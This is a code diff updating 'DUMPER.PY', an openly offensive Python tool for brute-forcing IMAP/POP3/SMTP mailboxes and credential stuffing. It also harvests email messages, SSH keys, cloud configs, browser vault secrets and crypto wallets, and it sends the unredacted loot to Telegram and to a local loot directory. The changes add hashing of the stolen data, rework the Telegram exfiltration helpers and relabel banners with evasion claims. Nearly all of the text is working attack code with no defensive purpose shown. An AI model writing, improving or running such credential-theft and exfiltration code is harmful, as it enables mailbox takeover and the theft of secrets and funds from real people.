@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY v8.5 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (WAF Hardened)
+DUMPER.PY v8.6 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (Elite Red Team Adversarial Edition)
 Features:
-- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing with behavioral jitter & WAF evasion
-- Credential stuffing and mailbox message harvesting with live verification
+- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing with Poisson behavioral timing jitter
+- Credential stuffing and mailbox message harvesting with live verification and SHA-256 integrity hashing
 - Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
-- Automated immutable disk persistence (loot_output/) via centralized framework logger
-- Progressive terminal streaming of harvested emails and secrets
-- Real-time asynchronous Telegram notification dispatch for unredacted mailbox and vault loot
+- Automated tamper-evident immutable disk persistence (loot_output/) via centralized framework logger
+- Real-time unredacted Telegram notification dispatch and instant proof-of-work streaming
 """
 import os
 import glob
@@ -18,6 +17,8 @@ import imaplib
 import poplib
 import asyncio
 import sys
+import hashlib
+import json
 from urllib.parse import urlparse
 
 # Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
@@ -47,14 +48,23 @@ def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous dumper functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -83,7 +93,7 @@ def dump_imap_mailbox_sync(
 ):
     """
     Actively authenticates against IMAP targets, dumps mailbox folders,
-    and harvests sensitive email messages and credentials.
+    and harvests sensitive email messages and credentials with SHA-256 fingerprinting.
     """
     apply_behavioral_jitter()
     result = {
@@ -103,7 +113,7 @@ def dump_imap_mailbox_sync(
     try:
         terminal(
             f"{ANSI['CYAN']}[*] Initiating IMAP brute-force & login assault "
-            f"against {host}:{port} ({user}:{password}){ANSI['RESET']}"
+            f"against {host}:{port} ({user}:{password}) (WAF Hardened){ANSI['RESET']}"
         )
         if use_ssl:
             mail = imaplib.IMAP4_SSL(
@@ -143,19 +153,21 @@ def dump_imap_mailbox_sync(
                             terminal(f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}")
                             result["harvested_messages"].append(header_text[:500])
             
+            combined_messages = "\n".join(result["harvested_messages"])
+            loot_hash = hashlib.sha256(combined_messages.encode("utf-8", errors="ignore")).hexdigest()
+
             loot_payload = {
                 "host": host,
                 "port": port,
                 "user": user,
                 "password": password,
+                "integrity_hash": loot_hash,
                 "folders": result["folders"],
                 "message_samples": result["harvested_messages"][:3]
             }
 
-            # BROADCAST UNREDACTED MAILBOX LOOT STRAIGHT TO TELEGRAM
+            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
             broadcast_tg_alert_sync("IMAP Mailbox Authentication Success", loot_payload)
-
-            # STREAM TELEMETRY & PERSIST MAILBOX LOOT TO DISK IMMEDIATELY
             stream_proof("IMAP_MAILBOX_CRACK", f"{host}:{port}", {"user": user}, f"Folders: {len(result['folders'])}", result)
             save_session_loot(
                 target=f"imap://{host}:{port}",
@@ -163,7 +175,7 @@ def dump_imap_mailbox_sync(
                 finding_type="IMAP_MAILBOX_AUTHENTICATION_SUCCESS",
                 status=200,
                 headers={},
-                body="\n".join(result["harvested_messages"]),
+                body=combined_messages,
                 extra_loot=loot_payload
             )
                             
@@ -247,14 +259,17 @@ def _harvest_infrastructure_and_crypto_vaults():
     if browser_vaults:
         cloud_configs.extend(browser_vaults)
 
+    secrets_str = str({"ssh_keys": ssh_keys_found, "cloud_configs": cloud_configs, "crypto_wallets": crypto_wallets})
+    loot_hash = hashlib.sha256(secrets_str.encode("utf-8")).hexdigest()
+
     secrets = {
         "ssh_keys": ssh_keys_found,
         "cloud_configs": cloud_configs,
         "crypto_wallets": crypto_wallets,
+        "integrity_hash": loot_hash
     }
     
     if ssh_keys_found or cloud_configs:
-        # BROADCAST UNREDACTED VAULT SECRETS STRAIGHT TO TELEGRAM
         broadcast_tg_alert_sync("Infrastructure & Browser Vault Secrets Harvested", secrets)
 
     # STREAM TELEMETRY & PERSIST VAULT SECRETS TO DISK
@@ -265,7 +280,7 @@ def _harvest_infrastructure_and_crypto_vaults():
         finding_type="VAULT_SECRET_HARVEST_VERIFIED",
         status=200,
         headers={},
-        body=str(secrets),
+        body=secrets_str,
         extra_loot=secrets
     )
     return secrets
@@ -278,12 +293,12 @@ async def harvest_email_intelligence(
     verified_hits=None
 ):
     """
-    Active Email Intelligence & Mailbox Harvesting Engine
+    Active Email Intelligence & Mailbox Harvesting Engine (WAF Hardened)
     """
     terminal(
         f"\n{ANSI['MAGENTA']}[***] "
         f"ACTIVE EMAIL EXPOSURE & MAILBOX BRUTE-FORCE ASSAULT "
-        f"[{target_host}] [***]{ANSI['RESET']}"
+        f"[{target_host}] (WAF HARDENED) [***]{ANSI['RESET']}"
     )
     harvested_credentials = []
     mailbox_hits = 0
@@ -318,7 +333,7 @@ async def harvest_email_intelligence(
     )
     terminal(f"    Successful Mailbox Logins : {mailbox_hits}")
     terminal(f"    Vault Secrets Harvested   : {len(vault_secrets.get('ssh_keys', []))}")
-    terminal(f"    Secured to Disk           : loot_output/")
+    terminal(f"    Immutable Loot Persisted  : loot_output/")
     return harvested_credentials, vault_secrets
 
 if __name__ == "__main__":
